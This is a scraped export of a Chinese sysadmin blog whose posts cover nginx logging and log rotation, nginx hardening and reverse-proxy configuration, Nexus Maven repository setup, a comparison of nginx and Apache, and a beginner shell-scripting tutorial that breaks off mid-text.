$http_x_forwarded_for客户端的真实ip。当nginx前面有代理服务器时，$remote_addr获取到的只能是nginx上一级的IP，而反向代理服务器在转发请求的http头信息中可以增加x_forwarded_for信息用以记录原有客户端的IP地址和原来客户端的请求的服务器地址，$http_x_forwarded_for参数就是承接上一级传递的客户端IP参数。从而就获取到了客户端的真实IP。 access_log 指令用来指定日志文件的存放路径，可以在http、server、location中设置 举例说明如下 access_log logs/access.log main; 如果想关闭日志可以如下 access_log off; 2、错误日志错误日志主要记录客户端访问Nginx出错时的日志格式，不支持自定义。由指令error_log来指定具体格式如下 1error_log path(存放路径) level(日志等级)【debug | info | notice | warn | error |crit】 如果不指定路径的话默认是在logs下。 3.生产环境下常用的日志格式：12log_format main '$http_host-$http_x_forwarded_for $&#123;request_time&#125;s- [$time_local] \"$request\"' '$status $body_bytes_sent\"$http_referer\" \"$http_user_agent\" $remote_addr ' ; 二、日志管理1.nginx日志切割 实现思路：每天定时把日志移动到备份目录，然后重新reload或者restart。这样会在原来的logs下生成新的日志文件。(提示：当日志文件被移动到备份目录后，在没有restart的之前，nginx依然会向原来的日志文件中记录访问请求，只有等restart的之后生成了新文件，才重新记录到新的日志文件中)实现脚本： 123456789101112131415161718192021222324#!/bin/bash#created by yangc #Log DirDIR_LOG=\"/var/log/nginx/\"weblog=(weixin1.ihaozhuo.com)DATE=`date -d\"yesterday\" +\"%Y%m%d\"` if [ ! -d\"$&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;\" ];then mkdir -p $&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;fiDIR=\"$&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;\" NGINX_LOG=\"$&#123;DIR_LOG&#125;/current\" for log in $&#123;weblog[@]&#125;; domv $&#123;NGINX_LOG&#125;/$log $DIRdone kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`sleep 130find $&#123;DIR_LOG&#125;/cut_log/* -typed -mtime +7 -exec rm -rf &#123;&#125; \\;sleep 130 2.nginx不记录某些文件或目录的访问日志方法：先用location 定义不记录日志的文件或目录，然后在其下面用 access_log off; 进行关闭日志即可例如： 123location ~*.\\checkstatus.html &#123; access_logoff;&#125;","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"确保Nginx安全的几个技巧","slug":"Web服务技术/Nginx/确保nginx安全的几个技巧","date":"2016-03-27T09:25:23.000Z","updated":"2017-04-12T13:36:10.000Z","comments":true,"path":"2016/03/27/Web服务技术/Nginx/确保nginx安全的几个技巧/","link":"","permalink":"http://blog.yangcvo.me/2016/03/27/Web服务技术/Nginx/确保nginx安全的几个技巧/","excerpt":"","text":"在配置文件中设置自定义缓存以限制缓冲区溢出攻击的可能性 1234client_body_buffer_size 1K;client_header_buffer_size 1k;client_max_body_size 1k;large_client_header_buffers 2 1k; 将timeout设低来防止DOS攻击所有这些声明都可以放到主配置文件中。 1234client_body_timeout 10;client_header_timeout 10;keepalive_timeout 5 5;send_timeout 10; 限制用户连接数来预防DOS攻击 12limit_zone slimits $binary_remote_addr 5m;limit_conn slimits 5; 个人觉得在防止DDOS攻击这方面，设置这些没太大用处，特别是第三点，很扰乱用户体验度的。","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nexus安装和配置搭建Maven私服","slug":"Java-Dubbo/Nexus安装和配置搭建Maven私服","date":"2016-03-26T09:44:04.000Z","updated":"2017-03-16T06:14:55.000Z","comments":true,"path":"2016/03/26/Java-Dubbo/Nexus安装和配置搭建Maven私服/","link":"","permalink":"http://blog.yangcvo.me/2016/03/26/Java-Dubbo/Nexus安装和配置搭建Maven私服/","excerpt":"","text":"Nexus安装和配置搭建Maven私服Nexus 安装和配置 Nexus 安装 官网：www.sonatype.org 官网下载：www.sonatype.org/nexus 此时（20160207） Nexus 最新版本为：2.12.0-01 JDK 要求是 JDK 7，官网要求 7u6 或之后版本，包括 JDK 8 官网帮助说明 1：Installing and Running Nexus 官网帮助说明 2：An Error Has Occurred - Let Us Help! 我个人习惯 /opt 目录下创建一个目录 setups 用来存放各种软件安装包；在 srv 目录下创建一个 program 用来存放各种解压后的软件包，下面的讲解也都是基于此习惯. 我个人已经使用了第三方源：EPEL、RepoForge，如果你出现 yum install XXXXX 安装不成功的话，很有可能就是你没有相关源，请查看我对源设置的文章. 压缩包下载（由于国内网络的原因不排除你下载不了）：wget http://download.sonatype.com/nexus/oss/nexus-2.12.0-01-bundle.tar.gz 如果地址下载不了，那是因为你需要开 VPN，你也可以选择降低要求下载 2.11.4-01 版本：百度云nexus 1234567891011121314151617解压压缩包：tar zxvf nexus-2.12.0-01-bundle.tar.gz -C /srv/program/.解压出来有两个文件夹：这是程序目录：nexus-2.12.0-01这是仓库目录：sonatype-work移到目录到我的安装目录下： /srv/program/进入安装目录：cd /srv/program/修改属组和权限：chown -R root:root /srv/program/ 编辑系统配置文件nexus环境变量: vim /etc/profile.d/nexus.sh# NexusNEXUS_HOME=/srv/program/nexus-2.12.0-01export NEXUS_HOMERUN_AS_USER=rootexport RUN_AS_USER刷新环境变量生效命令：source /etc/profile 由于目录 sonatype-work 以后是做仓库用的，会存储很多 jar，所以这个目录一定要放在磁盘空间大的区内，目前我们还没第一次启动 Nexus，所以这里还是空文件。 我个人习惯把这类目录放在 /srv 下，所以你要特别注意，下面有内容对这个文件夹进行操作的都是基于 srv 目录的：/srv/program/sonatype-work/ 设置配置文件：vim /srv/program/nexus-2.12.0-01/conf/nexus.properties 把文件中该值：nexus-work=${bundleBasedir}/../sonatype-work/nexus 改为：nexus-work=/srv/program/sonatype-work/nexus 默认情况下如果你的 JDK 等系统变量设置好的是无需编辑 Nexus 的配置文件，但是这里还是给大家一下配置文件路径：vim /srv/program/nexus2.11.4/bin/jsw/conf/wrapper.conf 开放防火墙端口： 123456vim /etc/sysconfig/iptables-A INPUT -i eth0 -s 192.168.1.0/24 -m state --state NEW -m tcp -p tcp --dport 8081 -j ACCEPT添加规则：sudo iptables -I INPUT -p tcp -m tcp --dport 8081 -j ACCEPT保存规则：sudo /etc/rc.d/init.d/iptables save重启iptables：sudo service iptables restart 测试安装结果： 1234567启动 Nexus：/srv/program/nexus-2.12.0-01/bin/nexus start查看启动日志：tail -200f /srv/program/nexus-2.12.0-01/logs/wrapper.log关闭 Nexus：/usr/program/nexus-2.12.0-01/bin/nexus stop访问：http://192.168.0.110:8081/nexus登录账号密码：账号密码：admin密码：admin123 Nexus 配置 修改默认端口：vim /srv/program/nexus-2.12.0-01/conf/nexus.properties，修改该值：application-port=8081 下载远程中央库的索引到服务器 开启远程索引 新搭建的neuxs环境只是一个空的仓库，需要手动和远程中心库进行同步，nexus默认是关闭远程索引下载，最重要的一件事情就是开启远程索引下载。 如上图标注 4 所示，把默认是 False 改为 True 远程存储：远程存储位置 然后在Apache Snapshots，Codehaus Snapshots和Maven Central这三个仓库上分别右键，选择Repari Index，这样Nexus就会去下载远程的索引文件。 这样设置以后, Nexus会自动从远程中央仓库下载索引文件, 为了检验索引文件自动下载是否生效,可以却换到Browse remote。 在左边菜单栏里面有个Artifact Search, 在输入框里面输入你想要搜索的构件名字,比如:maven, 那么查询结果如下： 创建任务开始进行索引下载。需要特别提醒的是，如果你的私服是虚拟机，那得保证你分配的硬盘足够大，别像我一样吝啬只给 10 G（现在还剩下 1.9 G），结果报：设备上没有空间 项目上配置链接连接私服（下面内容涉及到 maven 的基础知识，请自行私下学习）： 对项目独立设置： 打开项目的 pom.xml 文件： 添加下面内容： 1234567 &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;Nexus&lt;/id&gt; &lt;name&gt;虚拟机-192.168.0.110-Nexus&lt;/name&gt; &lt;url&gt;http://192.168.0.110:8081/nexus/content/groups/public/&lt;/url&gt;&lt;/repository&gt; &lt;/repositories&gt; 对全局配置进行设置： 打开 maven 的 settings.xml 文件： 添加下面内容： 12345678&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;YouMeekNexus&lt;/id&gt; &lt;name&gt;YouMeek Nexus&lt;/name&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://192.168.0.110:8081/nexus/content/groups/public/&lt;/url&gt; &lt;/mirror&gt;&lt;/mirrors&gt; 持续集成自动构建后发布到 Nexus 上 在 Maven 的 settings.xml 加上连接服务器信息： 12345678910111213&lt;!--设置私库认证信息，用户名和密码我就用默认的，如果你们有权限控制的需求可以创建对应的一些账号--&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; 在项目的 pom.xml 文件加上： 12345678910111213&lt;!-- nexus-releases nexus-snapshots 与 Maven 的配置文件 settings.xml 中 server 下的 id 对应 --&gt; &lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;name&gt;Nexus Releases Repository&lt;/name&gt; &lt;url&gt;http://192.168.0.110:8081/nexus/content/repositories/releases/&lt;/url&gt; &lt;/repository&gt; &lt;snapshotRepository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://192.168.0.110:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/snapshotRepository&gt; &lt;/distributionManagement&gt; Nexus 手动更新索引文件 手动更新索引 12345678910111213141516171819202122232425262728关闭 Nexus：/srv/program/nexus-2.12.0-01/bin/nexus stop命令：cd/opt/sonatype-work/nexus/indexer/central-ctx删除里面默认的文件：`rm -rf *`访问官网索引：&lt;http://repo.maven.apache.org/maven2/.index/&gt;下载文件：**nexus-maven-repository-index.gz**：wget http://repo.maven.apache.org/maven2/.index/nexus-maven-repository-index.gz下载文件：**nexus-maven-repository-index.properties**：wget http://repo.maven.apache.org/maven2/.index/nexus-maven-repository-index.properties下载索引解压工具：wget https://repo1.maven.org/maven2/org/apache/maven/indexer/indexer-cli/5.1.1/indexer-cli-5.1.1.jar执行解压命令（该命令执行需要4分钟左右）：java -jar indexer-cli-5.1.0.jar -u nexus-maven-repository-index.gz -d ./删除解压前文件：rm -rf indexer-cli-5.1.0.jar nexus-maven-repository-index.gz nexus-maven-repository-index.properties重启服务：/srv/program/nexus-2.12.0-01/bin/nexus start 资料 http://www.cnblogs.com/leefreeman/p/4211530.html http://www.itdadao.com/article/89071/ http://blog.zhaojunling.me/p/17 http://m.blog.csdn.net/article/details?id=49228873 http://mritd.me/2015/12/29/Nexus-2-11-CentOS%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/ http://mritd.me/2015/12/28/Nexus-%E7%A7%81%E6%9C%8D%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/ http://my.oschina.net/liangbo/blog/195739 http://www.mamicode.com/info-detail-1016489.html http://blog.csdn.net/shawyeok/article/details/23564681 http://zyjustin9.iteye.com/blog/2017321","raw":null,"content":null,"categories":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.yangcvo.me/categories/tomcat/"}],"tags":[{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","permalink":"http://blog.yangcvo.me/tags/Java-Tomcat-notes/"}]},{"title":"Nginx+Tomcat实现反向代理优化与配置","slug":"Web服务技术/Nginx/Nginx+Tomcat实现反向代理优化与配置 ","date":"2016-03-26T09:25:23.000Z","updated":"2017-03-31T11:00:13.000Z","comments":true,"path":"2016/03/26/Web服务技术/Nginx/Nginx+Tomcat实现反向代理优化与配置 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/26/Web服务技术/Nginx/Nginx+Tomcat实现反向代理优化与配置 /","excerpt":"","text":"Nginx+Tomcat实现反向代理什么是反向代理反向代理（Reverse Proxy）方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 举个例子，一个用户访问 http://www.example.com/readme，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。 反向代理服务器，对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。如下图所示： 反向代理典型应用场景反向代理的典型用途是将防火墙后面的服务器提供给 Internet 用户访问，加强安全防护。反向代理还可以为后端的多台服务器提供负载均衡，或为后端较慢的服务器提供 缓冲 服务。另外，反向代理还可以启用高级 URL 策略和管理技术，从而使处于不同 web 服务器系统的 web 页面同时存在于同一个 URL 空间下。 Nginx 的其中一个用途是做 HTTP 反向代理，下面简单介绍 Nginx 作为反向代理服务器的方法。 场景描述：访问本地服务器上的 README.md 文件 http://localhost/README.md，本地服务器进行反向代理，从 https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md 获取页面内容。 nginx.conf 配置示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647worker_processes 1;pid logs/nginx.pid;error_log logs/error.log warn;events &#123; worker_connections 3000;&#125;http &#123; include mime.types; server_tokens off; ## 下面配置反向代理的参数 server &#123; listen 80; ## 1. 用户访问 http://ip:port，则反向代理到 https://github.com location / &#123; proxy_pass https://github.com; proxy_redirect off; ##proxy_redirect 其作用是对发送给客户端的 URL 进行修改。 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; ##后端的 Web 服务器可以通过 X-Forwarded-For 获取用户真实 IP &#125;#以下是一些反向代理的配置,可选。 proxy_set_header Host $host; 注意: “proxy_set_header”当我们的 RS 有多个虚拟主机(相同的 ip,相同的端口)的 时候如 www、bbs、blog,代理服务器怎么知道将请求发到哪呢,这个时候 nginx 代 理就会查找 proxy_set_header 参数,将请求发送到相应域名的虚拟主机上。client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数, proxy_connect_timeout 90; #nginx 跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #连接成功后,后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器(nginx)保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers 缓冲区,网页平均在 32k 以下的设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小(proxy_buffers*2) proxy_temp_file_write_size 64k; ## 2.用户访问 http://ip:port/README.md，则反向代理到 ## https://github.com/.../README.md location /README.md &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md; &#125; &#125;&#125; 成功启动 nginx 后，我们打开浏览器，验证下反向代理的效果。在浏览器地址栏中输入 localhost/README.md，返回的结果是我们 github 源代码. 我们只需要配置一下 nginx.conf 文件，不用写任何 web 页面，就可以偷偷地从别的服务器上读取一个页面返回给用户。 下面我们来看一下 nginx.conf 里用到的配置项： （1）location location 项对请求 URI 进行匹配，location 后面配置了匹配规则。例如上面的例子中，如果请求的 URI 是 localhost/，则会匹配 location / 这一项；如果请求的 URI 是 localhost/README.md，则会匹配 location /README.md 这项。 上面这个例子只是针对一个确定的 URI 做了反向代理，有的读者会有疑惑：如果对每个页面都进行这样的配置，那将会大量重复，能否做 批量 配置呢？此时需要配合使用 location 的正则匹配功能。具体实现方法可参考本书的 URL 匹配章节。 （2）proxy_pass proxy_pass 后面跟着一个 URL，用来将请求反向代理到 URL 参数指定的服务器上。例如我们上面例子中的 proxy_pass https://github.com，则将匹配的请求反向代理到 https://github.com。 （3）proxy_set_header 默认情况下，反向代理不会转发原始请求中的 Host 头部，如果需要转发，就需要加上这句：proxy_set_header Host $host; 除了上面提到的常用配置项，还有 proxy_redirect、proxy_set_body、proxy_limit_rate 等参数，具体用法可以到Nginx 官网查看。 缓存指令依赖代理缓冲区(buffers),如果 proxy_buffers 设置为 off,缓存不会生效。 正向代理既然有反向代理，自然也有正向代理。简单来说，正向代理就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的，我们需要在这些正向代理工具上配置服务器的 IP 地址等信息。","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nginx-反向代理","slug":"Web服务技术/Nginx/ Nginx 和 apache 对比 ","date":"2016-03-26T09:25:23.000Z","updated":"2017-04-12T12:35:55.000Z","comments":true,"path":"2016/03/26/Web服务技术/Nginx/ Nginx 和 apache 对比 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/26/Web服务技术/Nginx/ Nginx 和 apache 对比 /","excerpt":"","text":"Nginx 和 apache 对比个人理解：存在就是理由,一般来说,需要性能的 web 服务,用 nginx 。如果不需要性能只求稳定, 那就 apache 吧。后者的各种功能模块实现得比前者,例如 ssl 的模块就比前者好,可配 置项多。 这里要注意一点,epoll(freebsd 上是 kqueue )网络 IO 模型是 nginx 处理性能 高的根本理由,但并不是所有的情况下都是 epoll 大获全胜的,如果本身提供静态服务的 就只有寥寥几个文件,apache 的 select 模型或许比 epoll 更高性能。当然,这只是根据 网络 IO 模型的原理作的一个假设,真正的应用还是需要实测了再说的。 2、作为 Web 服务器:相比 Apache,Nginx 使用更少的资源,支持更多的并发连接, 体现更高的效率,这点使 Nginx 尤其受到虚拟主机提供商的欢迎。在高连接并发的情况下, Nginx 是 Apache 服务器不错的替代品: Nginx 在美国是做虚拟主机生意的老板们经常选择 的软件平台之一. 能够支持高达 50,000 个并发连接数的响应, 感谢 Nginx 为我们选择了 epoll and kqueue 作为开发模型. Nginx 作为负载均衡服务器: Nginx既可以在内部直接支持 Rails和PHP 程序对外进行 服务, 也可以支持作为 HTTP 代理 服务器对外进行服务. Nginx 采用 C 进行编写, 不论是 系统资源开销还是 CPU 使用效率都比 Perlbal 要好很多. 作为邮件代理服务器: Nginx 同时也是一个非常优秀的邮件代理服务器(最早开发这个产品 的目的之一也是作为邮件代理服务器), Last.fm 描述了成功并且美妙的使用经验. Nginx 是一个安装非常的简单 , 配置文件非常简洁(还能够支持 perl 语法),Bugs非常少的服务器:Nginx启动特别容易, 并且几乎可以做到7*24不间断运行,即使运行数个月 也不需要重新启动. 你还能够不间断服务的情况下进行软件版本的升级 . Apache 与 Nginx 的优缺点比较 1、nginx 相对于 apache 的优点: 轻量级,同样起 web 服务,比 apache 占用更少的内存及资源抗并发,nginx 处理请求是异步非阻塞的,而 apache 则是阻塞型的,在高并发下 Nginx能保持低资源低消耗高性能 高度模块化的设计,编写模块相对简单 社区活跃,各种高性能模块出品迅速 2、 apache 相对于 nginx 的优点: rewrite ,比 nginx 的 rewrite 强大 模块超多,基本想到的都可以找到少 bug , nginx 的 bug 相对较多 (现在 bug 方面应该没多大区别) 超稳定 3、Nginx 配置简洁, Apache 复杂 Nginx 静态处理性能比 Apache 高 3 倍以上 Apache 对 PHP 支持比较简单,Nginx 需要配合其他后端用 Apache 的组件比 Nginx 多现在 Nginx 才是 Web 服务器的首选 4、最核心的区别在于 apache 是同步多进程模型,一个连接对应一个进程;nginx 是异步 的,多个连接(万级别)可以对应一个进程 5、nginx 处理静态文件好,耗费内存少.但无疑 apache 仍然是目前的主流,有很多丰富的特 性.所以还需要搭配着来.当然如果能确定 nginx 就适合需求,那么使用 nginx 会是更经济的方 式. 6、从个人过往的使用情况来看,nginx 的负载能力比 apache 高很多。最新的服务器也改 用 nginx 了。而且 nginx 改完配置能-t 测试一下配置有没有问题,apache 重启的时候发现 配置出错了,会很崩溃,改的时候都会非常小心翼翼现在看有好多集群站,前端 nginx 抗 并发,后端 apache 集群,配合的也不错。 7、nginx 处理动态请求是比较弱,一般动态请求要 apache 去做,nginx 只适合静态和反 向。8、nginx 是很不錯的前端服务器,负载性能很好, apache 对 php 等语言的支持很好,此外 apache 有强大的支持网路,发展时间相对 nginx 更久,bug 少但是 apache 有先天不 支持多核心处理负载的缺点,建议使用 nginx 做前端,后端用 apache。大型网站建议用 nginx 自代的集群功能.9、Nginx 优于 apache 的主要两点: 1.Nginx 本身就是一个反向代理服务器 2.Nginx 支持 7 层负载均衡;其他的当然,Nginx 可能会比 apache 支持更高的并发。 10、你对 web server 的需求决定你的选择。大部分情况下 nginx 都优于 APACHE,比如 说静态文件处理、PHP-CGI 的支持、反向代理功能、前端 Cache、维持连接等等。在 Apache+PHP(prefork)模式下,如果 PHP 处理慢或者前端压力很大的情况下,很容易 出现 Apache 进程数飙升,从而拒绝服务的现象。 11、可以看一下 nginx lua 模块:https://github.com/ chaoslaw…apache 比 nginx 多的 模块,可直接用 lua 实现 apache 是最流行的,why?大多数人懒得更新到 nginx 或者学新事物 12、对于 nginx,我喜欢它配置文件写的很简洁,正则配置让很多事情变得简单运行效率 高,占用资源少,代理功能强大,很适合做前端响应服务器 13、Apache 在处理动态有优势,Nginx 并发性比较好,CPU 内存占用低,如果 rewrite 频繁,那还是Apache吧","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"shell入门到简单 学习总结1-12章","slug":"shell编程入门到简单/shell入门到简单 学习总结1-12章","date":"2016-03-21T10:53:54.000Z","updated":"2017-05-02T06:13:55.000Z","comments":true,"path":"2016/03/21/shell编程入门到简单/shell入门到简单 学习总结1-12章/","link":"","permalink":"http://blog.yangcvo.me/2016/03/21/shell编程入门到简单/shell入门到简单 学习总结1-12章/","excerpt":"","text":"第一章Shell前言：Shell本身是一种用C语言编写的程序，从用户的角度来看，Shell是用户与Linux操作系统沟通的桥梁。用户既可以输入命令执行，又可以利用 Shell脚本编程，完成更加复杂的操作。在Linux GUI日益完善的今天在运维领域Shell编程仍然起着不可忽视的作用。深入地了解和熟练地掌握Shell编程，是每一个Linux用户的必修。 1.1 Linux的Shell种类：Bash在日常工作中被广泛使用，同时，Bash也是大多数Linux系统默认的Shell. 经常可以看到#!/bin/sh，它同样也可以改为#!/bin/bash。 第二章Shell脚本格式1.1 第一行#!的作用是指定该脚本程序的命令解释器： 123#!/bin/bashecho \"Hello the world\" 2.1 执行脚本需要添加权限和运行脚本的方式 12345chmod a+x print.sh 如果没有权限通过bash/sh方式：bash print.sh #调用bash程序解释器脚本内容执行sh print.sh #调用sh程序解释脚本内容并执行 第三章Shell变量shell变量变量是shell 传递数据的一种方法。变量是用来代表每个值的符号名。 1.1 Shell 有两类变量：临时变量和永久变量。 临时变量: 是shell 程序内部定义的，其使用范围仅限于定义它的程序，对其它程序不可见。永久变量: 是环境变量，其值不随shell 脚本的执行结束而消失。 例： 12[root@xuegod63 test]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin 2.1 用户定义变量：由字母或下划线打头。 由字母、数字或下划线组成，并且大小写字母意义不同。变量名长度没有限制。引用变量值时，要在变量名前加上前缀“$” 12345[root@xuegod63 test]# A=aaa# echo $Aaaa[root@xuegod63 test]# A = aaabash: A: command not found 3.1 位置变量和特殊变量 位置变量：Shell解释执行用户的命令时，将命令行的第一个字作为命令名，而其它字作为参数。由出现在命令行上的位置确定的参数称为位置参数。位置变量：使用$N 来表示 123[root@xuegod63 test]# ./example.sh file1 file2 file3$0 这个程序的文件名 example.sh$n 这个程序的第n个参数值，n=1..N 4.1 特殊变量： 有些变量是一开始执行Script脚本时就会设定，且不能被修改，但我们不叫它只读的系统变量，而叫它特殊变量。这些变量当一执行程序时就有了，以下是一些等殊变量： 12345$* 这个程序的所有参数$# 这个程序的参数个数$ 这个程序的PID$! 输出上一个后台程序的PID$? 输出上一个指令的返回值 5.1 自定义使用变量 使用一个定义过的变量，只要在变量名前面加美元符号即可，如： • 中间不能有空格，可以使用下划线（_）。• 不能使用标点符号。• 不能使用bash里的关键字（可用help命令查看保留关键字）。 12345678910111213[root@xuegod63 test]# cat expr.sh#! /bin/sha=10b=20c=30value1=`expr $a + $b + $c`echo \"The value of value1 is $value1\"value2=`expr $c / $b`echo \"The value of value2 is $value2\"value3=`expr $c \\* $b` #整除echo \"The value of value3 is $value3\"value4=`expr $a + $c / $b`echo \"The value of value4 is $value4\" 测试： 12345[root@xuegod63 test]# ./expr.shThe value of value1 is 60The value of value2 is 1The value of value3 is 600The value of value4 is 11 这里在说明点： 变量名外面的花括号是可选的，加不加都行，加花括号是为了帮助解释器识别变量的边界，比如下面这种情况： 1234for skill in Ada Coffe Action Javado echo \"I am good at $&#123;skill&#125;Script\"done 如果不给skill变量加花括号，写成echo &quot;I am good at $skillScript&quot;，解释器就会把$skillScript当成一个变量（其值为空），代码执行结果就不是我们期望的样子了。 推荐给所有变量加上花括号，这是个好的编程习惯。 这里在变量使用read，课外补充： read命令接收标准输入（键盘）的输入，或者其他文件描述符的输入。得到输入后，read命令将数据放入一个标准变量中。 123456789101.基本读取#!/bin/bash echo -n \"Enter your name:\" #参数-n的作用是不换行，echo默认是换行 read name #从键盘输入 echo \"hello $name, welcome to my program\" exit 0 #退出shell程序。其等效于以下：read -p \"Enter your name:\" name #-p参数，允许在read命令行中直接指定一个提示 使用read命令存在着潜在危险。脚本很可能会停下来一直等待用户的输入。如果无论是否输入数据脚本都必须继续执行，那么可以使用 -t 选项指定一个计时器，指定read命令等待输入的秒数。当计时满时，read命令返回非零值（0为正常退出状态）; 举例： 12345678#!/bin/bash if read -t 5 -p \"please enter your name:\" name then echo \"hello $name, welcome to my script\" else echo \"sorry,too slow\" fi exit 0 第四章Shell特殊变量：Shell $0, $#, $*, $@, $?, $$和命令行参数我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推…… 下面是$其他参数使用方法,一般用的比较多的都是传递脚本参数： 1234567$# 传递到脚本的参数个数$* 以一个单字符串显示所有向脚本传递的参数。如\"$*\"用「\"」括起来的情况、以\"$1 $2 … $n\"的形式输出所有参数。$$ 脚本运行的当前进程ID号$! 后台运行的最后一个进程的ID号$@ 与$*相同，但是使用时加引号，并在引号中返回每个参数。如\"$@\"用「\"」括起来的情况、以\"$1\" \"$2\" … \"$n\" 的形式输出所有参数。$- 显示Shell使用的当前选项，与set命令功能相同。$? 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 这个跟我们自定义变量有点区别， 看例子脚本： 12345678910111213#!/bin/bash#author=yangc#blog.yangcvo.meecho \"shell 脚本很好用1：$1\";echo \"shell 脚本很好用2：$2\";echo \"shell 脚本很好用3：$3\";echo \"File Name: $0\"echo \"First Parameter : $1\"echo \"First Parameter : $2\"echo \"Quoted Values: $@\"echo \"Quoted Values: $*\"echo \"Total Number of Parameters : $#\" 使用脚本传递参数： 123456789shell 脚本很好用1：3shell 脚本很好用2：4shell 脚本很好用3：6File Name: sh.shFirst Parameter : 3First Parameter : 4Quoted Values: 3 4 6Quoted Values: 3 4 6Total Number of Parameters : 3 第五章 Shell替换：Shell变量替换，命令替换，转义字符如果表达式中包含特殊字符，Shell 将会进行替换。例如，在双引号中使用变量就是一种替换，转义字符也是一种替换。 123#!/bin/basha=10echo -e \"Value of a is $a \\n\" 运行结果： 1Value of a is 10 这里 -e 表示对转义字符进行替换。如果不使用 -e 选项，将会原样输出： 1Value of a is 10\\n 2.1 命令替换 命令替换是指Shell可以先执行命令，将输出结果暂时保存，在适当的地方输出。 1234567#!/bin/bashDATE=`date`echo \"Date is $DATE\"USERS=`who | wc -l`echo \"Logged in user are $USERS\"UP=`date ; uptime`echo \"Uptime is $UP\" 运行结果： 1234Date is 2017年 04月 28日 星期五 11:41:34 CSTLogged in user are 1Uptime is 2017年 04月 28日 星期五 11:41:34 CST11:41:34 up 266 days, 10:43, 1 user, load average: 0.33, 0.14, 0.11 第六章Shell注释以“#”开头的行就是注释，会被解释器忽略。这里因为很多写脚本都带有个性的风格，这样写的更加有乐趣。 sh里没有多行注释，只能每一行加一个#号。只能像这样： 12345678910111213#--------------------------------------------# 这是一个自动打ipa的脚本，基于webfrogs的ipa-build书写：# 